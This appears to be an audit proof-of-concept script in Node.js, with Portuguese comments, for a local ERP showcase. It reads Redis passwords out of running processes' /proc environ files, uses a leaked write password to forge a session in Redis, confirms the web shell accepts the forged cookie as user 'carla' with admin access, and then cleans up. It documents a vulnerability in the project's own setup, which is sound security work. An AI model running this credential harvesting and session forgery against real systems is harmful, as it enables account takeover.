// Prova (auditor_b1_d1_8): o showcase com ERP_REDIS_SENHA_SHELL definida, exatamente como base/showcase/subir.mjs
// monta o ambiente (linhas 31-35), sem subir o docker compose. Lê /proc/<pid>/environ de cada processo e, só com o
// que a ZONA tem no ambiente, grava uma sessão forjada; confere que o shell a aceita; apaga a chave.
import { readFileSync } from 'node:fs'
import { createHash } from 'node:crypto'
import { createConnection } from 'node:net'
import { join } from 'node:path'
import { subir, RAIZ } from '../../../base/scripts/ambiente.mjs'
import { pedir, entrar } from '../../../base/verificacao/apoio.mjs'
process.env.ERP_REDIS_SENHA_SHELL ??= 'dev-shell-escrita'   // o operador definiu a senha (compose e subir.mjs a leem)
process.env.DADOS_DIR ??= join(RAIZ, 'erp-dominio-stub', 'dados', 'estado')
process.env.REDIS_URL ??= `redis://default:${process.env.ERP_REDIS_SENHA_SHELL ?? 'dev-shell-escrita'}@127.0.0.1:6379`
process.env.REDIS_URL_ZONA ??= `redis://zona:${process.env.ERP_REDIS_SENHA_ZONA ?? 'dev-zona-leitura'}@127.0.0.1:6379`
delete process.env.DADOS_DIR  // não grava no estado versionado do stub
const resp = (...a) => `*${a.length}\r\n` + a.map((x) => `$${Buffer.byteLength(x)}\r\n${x}\r\n`).join('')
const redis = (cmds) => new Promise((ok, falha) => { const c = createConnection({ host: '127.0.0.1', port: 6379 }); let d = ''; c.on('data', (x) => { d += x }); c.on('close', () => ok(d)); c.on('error', falha); c.write([...cmds, ['QUIT']].map((a) => resp(...a)).join('')) })
const amb = await subir({ construir: false })
const id = 'forjada-aud8-senha'
const chave = `erp:sessao:${createHash('sha256').update(id).digest('hex')}`
try {
  for (const [dir, p] of amb.apps) {
    const env = Object.fromEntries(readFileSync(`/proc/${p.pid}/environ`, 'utf8').split('\0').filter(Boolean).map((l) => [l.slice(0, l.indexOf('=')), l.slice(l.indexOf('=') + 1)]))
    console.log(`${dir}: REDIS_URL=${'REDIS_URL' in env} ERP_REDIS_SENHA_SHELL=${env.ERP_REDIS_SENHA_SHELL ?? '(ausente)'}`)
  }
  const z1 = amb.apps.get('erp-zona-1')
  const envZona = Object.fromEntries(readFileSync(`/proc/${z1.pid}/environ`, 'utf8').split('\0').filter(Boolean).map((l) => [l.slice(0, l.indexOf('=')), l.slice(l.indexOf('=') + 1)]))
  // só o que a zona tem: a senha do ambiente dela e o endereço (o mesmo de REDIS_URL_ZONA)
  const host = new URL(envZona.REDIS_URL_ZONA)
  // formato da sessão: a zona lê com o usuário de leitura dela a sessão de uma pessoa (aqui, a da carla)
  const carla = await entrar('carla')
  const lido = await redis([['AUTH', 'zona', decodeURIComponent(host.password)], ['GET', `erp:sessao:${createHash('sha256').update(carla.id).digest('hex')}`]])
  const sessao = lido.split('\r\n').find((l) => l.startsWith('{'))
  console.log('sessao da carla lida pela zona (usuario zona):', sessao ? `${sessao.length} bytes` : lido)
  const r = await redis([['AUTH', 'default', envZona.ERP_REDIS_SENHA_SHELL], ['SET', chave, sessao, 'EX', '300']])
  console.log(`zona 1 grava com a senha do proprio ambiente (${host.host}):`, JSON.stringify(r))
  for (const c of ['/', '/acesso', '/zona1']) {
    const x = await pedir(c, { cookie: `__Host-session=${id}` })
    console.log(`cookie forjado (nunca emitido pelo shell) ${c}: ${x.status}`, /Gestão de acesso/.test(x.html ?? '') ? '(pagina de administracao)' : '', /carla/i.test(x.html ?? '') ? '(como carla)' : '')
  }
} finally {
  const d = await redis([['AUTH', 'default', 'dev-shell-escrita'], ['DEL', chave], ['EXISTS', chave]])
  console.log('limpeza DEL/EXISTS:', JSON.stringify(d))
  amb.derrubar()
}
